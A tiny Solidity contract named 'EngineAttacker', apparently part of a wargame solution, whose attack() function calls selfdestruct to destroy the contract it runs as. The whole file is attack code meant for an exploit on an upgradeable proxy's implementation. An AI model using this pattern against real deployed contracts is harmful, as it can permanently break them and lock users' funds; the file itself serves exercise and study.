// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract EngineAttacker {

    function attack() external {
        selfdestruct(payable(msg.sender));
    }
}